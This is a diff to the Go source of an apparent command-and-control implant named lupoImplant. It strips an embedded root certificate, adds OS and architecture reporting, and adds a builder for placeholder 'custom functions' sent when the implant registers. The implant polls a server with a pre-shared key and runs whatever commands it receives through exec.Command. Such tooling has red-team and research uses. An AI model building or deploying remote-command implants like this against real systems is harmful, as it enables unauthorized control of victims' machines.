@@ -12,6 +12,7 @@ import (
 	"net/url"
 	"os"
 	"os/exec"
+	"runtime"
 	"strconv"
 	"strings"
 	"time"
@@ -33,21 +34,7 @@ type lupoImplant struct {
 
 var implant *lupoImplant
 
-var rootCert string = `-----BEGIN CERTIFICATE-----
-MIICaTCCAe6gAwIBAgIUFsFVZMSzwVg8myND+3MhD7+Xy+0wCgYIKoZIzj0EAwIw
-XTELMAkGA1UEBhMCVVMxDTALBgNVBAgMBEx1cG8xDTALBgNVBAcMBEx1cG8xDTAL
-BgNVBAoMBEx1cG8xDTALBgNVBAsMBEx1cG8xEjAQBgNVBAMMCTEyNy4wLjAuMTAe
-Fw0yMjEyMjAxODMwNDNaFw0zMjEyMTcxODMwNDNaMF0xCzAJBgNVBAYTAlVTMQ0w
-CwYDVQQIDARMdXBvMQ0wCwYDVQQHDARMdXBvMQ0wCwYDVQQKDARMdXBvMQ0wCwYD
-VQQLDARMdXBvMRIwEAYDVQQDDAkxMjcuMC4wLjEwdjAQBgcqhkjOPQIBBgUrgQQA
-IgNiAARP7ucL1LZB4PPCVDy78d/z1E20DDF6iux5hCThtB9ueWfXLctJ0MbGXytY
-yw+gVqTpGFBoiR+kfnF4a1R3a+kPlEUPs1KtfPQCsG4eTKWnCKGLnZ1f40PDT86k
-ixnQVsGjbzBtMB0GA1UdDgQWBBR28gJWZmhWPz3BY5d9P6klMb3GyzAfBgNVHSME
-GDAWgBR28gJWZmhWPz3BY5d9P6klMb3GyzAPBgNVHRMBAf8EBTADAQH/MBoGA1Ud
-EQQTMBGCCTEyNy4wLjAuMYcEfwAAATAKBggqhkjOPQQDAgNpADBmAjEAmtbElozU
-3THUBtd13xRzLFZOHygdjmkQIoqR4TiqLj4P15Or0h7uxRrbaSF15JJ0AjEA5BJZ
-ajLpktaGtNSFjPR/+9ZpeRgA7ykA6Yq5l856hcVlvtSACLMfRqSnmpI1MH/Y
------END CERTIFICATE-----
+var rootCert string = `
 `
 
 func main() {
@@ -116,8 +103,13 @@ func ExecLoop(implant *lupoImplant, client *http.Client) {
 
 	if implant.id == -1 {
 
+		arch := getArchitecture()
+
+		// Build custom user defined functions
+		customFunctions := buildCustomFunctions()
+
 		// Request registration passing a PSK and the register flag as true
-		requestParams = "/?psk=" + implant.psk + "&register=true&update=" + strconv.Itoa(implant.updateInterval) + "&functions=" + url.QueryEscape("{\"rootme\":\"roots any system ever, no seriously\"}")
+		requestParams = "/?psk=" + implant.psk + "&register=true&update=" + strconv.Itoa(implant.updateInterval) + "&arch=" + arch + "&functions=" + url.QueryEscape(customFunctions)
 		requestUrl = connectionString + requestParams
 
 		resp, err := client.Get(requestUrl)
@@ -258,6 +250,8 @@ func ExecLoop(implant *lupoImplant, client *http.Client) {
 			} else if cmd != "" {
 				if cmd == "rootme" {
 					dataString = "you're not good enough to be root :("
+				} else if cmd == "other_func" {
+					dataString = "this does nothing it's just a placeholder :)"
 				} else {
 					data, err = exec.Command(cmd).Output()
 				}
@@ -284,4 +278,32 @@ func ExecLoop(implant *lupoImplant, client *http.Client) {
 
 		}
 	}
+}
+
+func getArchitecture() string {
+
+	arch := runtime.GOOS + "/" + runtime.GOARCH
+
+	return arch
+
+}
+
+func buildCustomFunctions() string {
+	custom_functions := []string{
+		"\"rootme\":\"gives instant root every time\"",
+		"\"other_func\":\"does funky things\""}
+
+	customFunctionStr := "{"
+	for index, custom_fun := range custom_functions {
+
+		if index == len(custom_functions)-1 {
+			customFunctionStr += custom_fun
+		} else {
+			customFunctionStr += custom_fun + ","
+		}
+
+	}
+	customFunctionStr += "}"
+
+	return customFunctionStr
 }
